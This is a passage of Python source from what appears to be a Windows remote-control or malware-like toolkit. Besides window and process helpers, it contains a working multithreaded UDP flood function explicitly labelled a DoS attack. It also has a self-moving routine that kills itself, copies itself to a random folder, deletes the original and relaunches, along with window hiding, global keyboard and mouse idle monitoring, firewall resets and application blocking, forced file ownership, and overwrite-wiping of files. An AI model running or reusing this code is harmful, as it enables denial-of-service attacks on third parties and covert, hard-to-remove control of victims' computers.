        cmd_file.write(cmd_content)
    runcmd("start " + os.path.join(get_script_directory(), random_string))
    kill_self()

def get_hwnds_for_pid(pid):
    """Gets a list of window handles for a given process ID."""
    def callback(hwnd, hwnds):
        """Callback function for EnumWindows."""
        if win32gui.IsWindowVisible(hwnd) and win32gui.IsWindowEnabled(hwnd):
            _, found_pid = win32process.GetWindowThreadProcessId(hwnd)
            if found_pid == pid:
                hwnds.append(hwnd)
        return True
    hwnds = []
    win32gui.EnumWindows(callback, hwnds)
    return hwnds

def set_always_on_top_via_pid(pid):
    def callback(hwnd, hwnds):
        if win32gui.IsWindowVisible(hwnd) and win32gui.IsWindowEnabled(hwnd):
            _, found_pid = win32process.GetWindowThreadProcessId(hwnd)
            if found_pid == pid:
                hwnds.append(hwnd)
        return True

    hwnds = []
    win32gui.EnumWindows(callback, hwnds)

    if hwnds:
        for hwnd in hwnds:
            win32gui.SetWindowPos(hwnd, win32con.HWND_TOPMOST, 0, 0, 0, 0, 
                                  win32con.SWP_NOMOVE | win32con.SWP_NOSIZE)
        print(f"Set {len(hwnds)} windows to always on top for PID {pid}")
    else:
        print(f"No visible windows found for PID {pid}")

def set_always_on_top_via_name(name):
    for pid in get_pids_for_process_name(name):
        set_always_on_top_via_pid(pid)
    
def unset_always_on_top_by_pid(pid):
    def callback(hwnd, hwnds):
        if win32gui.IsWindowVisible(hwnd) and win32gui.IsWindowEnabled(hwnd):
            _, found_pid = win32process.GetWindowThreadProcessId(hwnd)
            if found_pid == pid:
                hwnds.append(hwnd)
        return True

    hwnds = []
    win32gui.EnumWindows(callback, hwnds)

    if hwnds:
        for hwnd in hwnds:
            win32gui.SetWindowPos(hwnd, win32con.HWND_NOTOPMOST, 0, 0, 0, 0, 
                                  win32con.SWP_NOMOVE | win32con.SWP_NOSIZE)
        print(f"Unset always on top for {len(hwnds)} windows of PID {pid}")
    else:
        print(f"No visible windows found for PID {pid}")
        
def unset_always_on_top_by_name(name):
    """Unsets always on top for a process by its name."""
    for pid in get_pids_for_process_name(name):
        unset_always_on_top_by_pid(pid)
    
def maximize_process_via_pid(pid):
    """Maximizes a process by its PID."""
    hwnds = get_hwnds_for_pid(pid)
    for hwnd in hwnds:
        win32gui.ShowWindow(hwnd, win32con.SW_RESTORE)
        win32gui.ShowWindow(hwnd, win32con.SW_MAXIMIZE)
        win32gui.SetForegroundWindow(hwnd)

def get_pids_for_process_name(process_name):
    """Returns a list of PIDs for a given process name."""
    pids = []
    for process in psutil.process_iter():
        try:
            if process.name().lower() == process_name.lower():
                pids.append(process.pid)
        except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
            pass
    return pids

def hide_process_via_name(name):
    """Hides a process by its name."""
    pids = get_pids_for_process_name(name)
    for pid in pids:
        hide_process_via_pid(pid)

def show_process_via_name(name):
     # Initialize COM for this thread
    pythoncom.CoInitialize()

    def enum_windows_callback(hwnd, result):
        _, pid = win32process.GetWindowThreadProcessId(hwnd)
        try:
            process = psutil.Process(pid)
            if process.name().lower() == name.lower():
                title = win32gui.GetWindowText(hwnd)
                if title:  # Only include windows with a title
                    result.append((hwnd, title))
        except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
            pass
        return True

    try:
        windows = []
        win32gui.EnumWindows(enum_windows_callback, windows)

        if not windows:
            print(f"No windows found for process: {name}")
            return

        shell = win32com.client.Dispatch("Shell.Application")

        for hwnd, title in windows:
            try:
                print(f"Attempting to show window: '{title}' (handle: {hwnd})")

                # Make the window visible first
                win32gui.ShowWindow(hwnd, win32con.SW_SHOW)
                
                # Try to restore the window if it's minimized
                win32gui.ShowWindow(hwnd, win32con.SW_RESTORE)
                
                # Bring the window to the foreground
                win32gui.SetForegroundWindow(hwnd)
                
                win32gui.SetForegroundWindow(hwnd)
                
                print(f"Successfully showed window: '{title}' (handle: {hwnd})")
            except Exception as e:
                print(f"Error showing window '{title}' (handle: {hwnd}): {str(e)}")

        print("Finished attempting to show hidden windows.")

    finally:
        # Uninitialize COM when we're done
        pythoncom.CoUninitialize()
        
        

def maximize_process_via_pid(pid):
    """Maximizes a process by its PID."""
    hwnds = get_hwnds_for_pid(pid)
    for hwnd in hwnds:
        win32gui.ShowWindow(hwnd, win32con.SW_RESTORE)
        win32gui.SetForegroundWindow(hwnd)
        win32gui.ShowWindow(hwnd, win32con.SW_MAXIMIZE)    

def maximize_process_via_name(name):
    """Maximizes a process by its name."""
    pids = get_pids_for_process_name(name)
    for pid in pids:
        maximize_process_via_pid(pid)
    
def minimize_process_via_pid(pid):
    """Minimizes a process by its PID."""
    hwnds = get_hwnds_for_pid(pid)
    for hwnd in hwnds:
        win32gui.ShowWindow(hwnd, win32con.SW_FORCEMINIMIZE)
    
def minimize_process_via_name(name):
    """Minimizes a process by its name."""
    pids = get_pids_for_process_name(name)
    for pid in pids:
        minimize_process_via_pid(pid)

def hide_process_via_pid(pid):
    """Hides a process by its PID."""
    hwnds = get_hwnds_for_pid(pid)
    for hwnd in hwnds:
        win32gui.ShowWindow(hwnd, win32con.SW_HIDE)
        
def get_process_name_from_pid(pid):
    """Returns the process name for a given PID.""" 
    return psutil.Process(pid).name()

def get_parent_process_name_from_pid(pid):
    """Returns the parent process name for a given PID."""
    return psutil.Process(pid).parent().name()

def get_own_parent_process_pid():
    """Returns the PID of the parent process."""
    return os.getppid()



def restart_self():
    """Restarts the script."""
    runcmd(f'start "{get_script_directory()}" "{os.path.join(get_script_directory(), get_script_filename())}"')
    runcmd('taskkill /f /im cmd.exe', retry=3) 
    kill_self()
    
    

def moveToFolder(ToWhere="Random"):
    """Moves the script to a specified folder."""
    if ToWhere.casefold() == "Random".casefold():
        ToWhere = get_random_folder()
    if " " in ToWhere:
        ToWhere = get_random_folder()
        while " " in ToWhere:
            ToWhere = get_random_folder()
    random_string = ''.join(random.choices(string.ascii_letters + string.digits, k=10)) + '.cmd'
    cmd_content = f"""
ping 127.0.0.1 -n 3 > nul
TASKKILL /F /T /PID {os.getpid()}
ping 127.0.0.1 -n 1 > nul
robocopy "{get_script_directory()}" "{ToWhere}" "{get_script_filename()}" /Z
ping 127.0.0.1 -n 1 > nul
del /f /q "{os.path.join(get_script_directory(), get_script_filename())}"
start cmd /k \"{os.path.join(ToWhere, get_script_filename())} delFile {os.path.join(get_script_directory(), random_string)} ren\"
    """
    with open(os.path.join(get_script_directory(), random_string), "w") as cmd_file:
        cmd_file.write(cmd_content)
    runcmd("start " + os.path.join(get_script_directory(), random_string))
    kill_self()

def is_system_user():
    """Checks if the script is running as the SYSTEM user."""
    token_info = ctypes.windll.advapi32.OpenProcessToken(ctypes.windll.kernel32.GetCurrentProcess(), 2, 1)
    sid_type = ctypes.c_ubyte()
    sid_size = ctypes.c_ulong(0)
    sid_data = ctypes.create_string_buffer(sid_size.value) 
    ctypes.windll.advapi32.GetTokenInformation(token_info, 1, ctypes.byref(sid_data), 0, ctypes.byref(sid_size))
    sid_size = ctypes.c_ulong(sid_size.value)
    ctypes.windll.advapi32.GetTokenInformation(token_info, 1, ctypes.byref(sid_data), sid_size, ctypes.byref(sid_size))
    ctypes.windll.advapi32.GetSidSubAuthorityCount(ctypes.cast(sid_data, ctypes.POINTER(ctypes.c_void_p)))
    ctypes.windll.advapi32.GetSidSubAuthority(ctypes.cast(sid_data, ctypes.POINTER(ctypes.c_void_p)), 1)
    return sid_type.value == 18



def check_if_mouse_moved(delta=3):
    """Checks if the mouse has moved by a certain delta."""
    x1, y1 = pyautogui.position()
    while True:
        time.sleep(0.1)
        x2, y2 = pyautogui.position()
        dx = abs(x1 - x2)
        dy = abs(y1 - y2)
        dt = math.sqrt(dx**2 + dy**2)
        if dt > delta:
            return True
        
def check_if_keyboard_pressed():
    """Checks if any keyboard key has been pressed."""
    def on_press(key):
        """Callback function for keyboard listener."""
        return False  # Stop the listener
    with pynput_keyboard.Listener(on_press=on_press) as listener:
        listener.join() 
    return True 

def update_last_keyboard_input_time():
    """Updates the timestamp of the last keyboard input."""
    global last_keyboard_input_time
    check_if_keyboard_pressed()
    last_keyboard_input_time = time.time()
    time.sleep(1)

def timer_how_long_since_last_keyboard_input():
    """Calculates the time since the last keyboard input."""
    global keyboard_idle, last_keyboard_input_time
    threading.Timer(0, update_last_keyboard_input_time).start()
    keyboard_idle = time.time() - last_keyboard_input_time

def start_timer_keyboardcheck():
    """Starts the timer for checking keyboard idle time."""
    threading.Timer(1.0, start_timer_keyboardcheck).start()
    timer_how_long_since_last_keyboard_input()

threading.Timer(1.0, start_timer_keyboardcheck).start()

def update_last_mouse_input_time():
    """Updates the timestamp of the last mouse input."""
    global last_mouse_input_time
    check_if_mouse_moved()
    last_mouse_input_time = time.time()
    time.sleep(1)

def timer_how_long_since_last_mouse_input():
    """Calculates the time since the last mouse input."""
    global mouse_idle, last_mouse_input_time
    threading.Timer(0, update_last_mouse_input_time).start()
    mouse_idle = time.time() - last_mouse_input_time

def start_timer_mousecheck():
    """Starts the timer for checking mouse idle time."""
    threading.Timer(1.0, start_timer_mousecheck).start()
    timer_how_long_since_last_mouse_input()

threading.Timer(1.0, start_timer_mousecheck).start()


def dosIPPORT(ipPORT):
    """Performs a DoS attack on a given IP address and port."""
    addr = ipPORT.split(':')
    print(f"DOS-ing {addr[0]}:{addr[1]}...")   
    ip = addr[0]
    port = int(addr[1])
    threads_count_to = int(12)
    
    def tosend():
        """Sends UDP packets to the target."""
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.bind(('0.0.0.0', 0))
        while True:
            sock.sendto(b'A!@#' * 1024 * 4, (ip, port))
            
    global DosingThreads
    for i in range(threads_count_to):
        t = KThread(target=tosend)
        DosingThreads.append(t)
        t.start()
        
def closedosingthreads():
    """Stops all DoS attack threads."""
    global DosingThreads
    print(f"Stopping {len(DosingThreads)} DoS threads...")
    while DosingThreads:
        thread = DosingThreads.pop()
        thread.kill()
    print("All DoS threads stopped.")

def name_port_check(name):
    """Returns a list of ports used by a process."""
    pids = get_pids_for_process_name(name)
    ports = [conn.laddr.port for pid in pids for conn in psutil.Process(pid).connections() if conn.laddr]
    ports = list(dict.fromkeys(ports))
    print(f'ports for {name}: {ports} ')
    return ports if ports else None

def reset_firewall():
    """Resets the Windows Firewall to its default settings."""
    programVL2('netsh advfirewall reset')

def block_application_by_name(application_name):
    """Blocks an application by its name using the firewall."""
    pids = get_pids_for_process_name(application_name)
    if pids:
        application_path = psutil.Process(pids[0]).exe()
        programVL2(f'netsh advfirewall firewall add rule name=BlockApplication dir=in action=block program="{application_path}"')
        programVL2(f'netsh advfirewall firewall add rule name=BlockApplication dir=out action=block program="{application_path}"')
        print(f"Blocked connections for application located at: {application_path}")
    else:
        print(f"No process found with the name: {application_name}")

def unblock_application_by_name(application_name):
    """Unblocks an application by its name using the firewall."""
    pids = get_pids_for_process_name(application_name)
    if pids:
        application_path = psutil.Process(pids[0]).exe()
        programVL2(f'netsh advfirewall firewall delete rule name=BlockApplication program="{application_path}"')
        print(f"Unblocked connections for application located at: {application_path}")
    else:
        print(f"No process found with the name: {application_name}")

def block_ports_for_application(application_name):
    """Blocks the ports used by an application."""
    ports = name_port_check(application_name)
    if ports:
        for port in ports:
            programVL2(f'netsh advfirewall firewall add rule name="BlockPort {str(port)}" dir=in action=block protocol=TCP localport={port}')
            print(f"Blocked port {port} for {application_name}")
    else:
        print(f"No ports found for application: {application_name}")

def unblock_ports_for_application(application_name):
    """Unblocks the ports used by an application."""
    ports = name_port_check(application_name)
    if ports:
        for port in ports:
            programVL2(f'netsh advfirewall firewall delete rule name="BlockPort {str(port)}"')
            print(f"Unblocked port {port} for {application_name}")
    else:
        print(f"No ports found for application: {application_name}")

def who_is_using_port(port): 
    """Returns the PID, path, and name of the process using a specific port."""
    for proc in psutil.process_iter(['pid', 'connections']):
        for conn in proc.info['connections']:
            if conn.raddr and conn.raddr.ip != '127.0.0.1' and int(conn.laddr.port) == int(port):
                return proc.pid, proc.exe().lower().replace('\\', '/').casefold(), proc.name()
    return None

def secure_delete_file(file_path, passes=3):
    """Securely delete a single file by overwriting it with random data."""
    try:
        file_size = os.path.getsize(file_path)
        with open(file_path, 'r+b') as file:
            for _ in range(passes):
                file.seek(0)
                file.write(os.urandom(file_size))
                file.flush()
        os.remove(file_path)
    except Exception as e:
        pass
        # print(f"Error deleting file {file_path}: {e}")
def secure_delete_directory(directory_path, passes=3):
    """
    Deletes directories and files within a given directory, 
    with a focus on those starting with '_' for potential 
    pyinstaller packaged application cleanup, without using shutil.
    """

    def deletion(root, dirs, files):
        for file in files:
            file_path = os.path.join(root, file)
            try:
                secure_delete_file(file_path, passes) 
            except Exception:
                pass

        # Delete directories in reverse order to handle nested directories
        for dir in reversed(dirs):
            dir_path = os.path.join(root, dir)
            if dir.startswith("_"):
                try:
                    delete_directory_recursively(dir_path)
                except Exception:
                    pass
            else:
                try:
                    os.rmdir(dir_path) 
                except OSError:
                    pass

    def delete_directory_recursively(dir_path):
        for root, dirs, files in os.walk(dir_path, topdown=False):
            for file in files:
                file_path = os.path.join(root, file)
                try:
                    secure_delete_file(file_path, passes)
                except Exception:
                    pass
            for dir in dirs:
                dir_path_inner = os.path.join(root, dir)
                try:
                    os.rmdir(dir_path_inner)
                except Exception:
                    pass
        try:
            os.rmdir(dir_path)
        except Exception:
            pass

    with ThreadPoolExecutor() as executor:
        for root, dirs, files in os.walk(directory_path):
            executor.submit(deletion, root, dirs, files)

def take_ownership(path):
    """Take ownership of the specified file or directory."""
    try:
        # Use the takeown command to take ownership of the directory or file
        subprocess.run(["takeown", "/f", path, "/r", "/d", "y"], check=True, shell=True)
        # Use icacls to grant full control to the current user
        subprocess.run(["icacls", path, "/grant", f"{os.getlogin()}:F", "/t"], check=True, shell=True)
    except subprocess.CalledProcessError as e:
        # print(f"Error taking ownership of {path}: {e}")
        pass
    
DosingThreads = []

threading.Timer(1.0, start_timer_keyboardcheck).start()
threading.Timer(1.0, start_timer_mousecheck).start()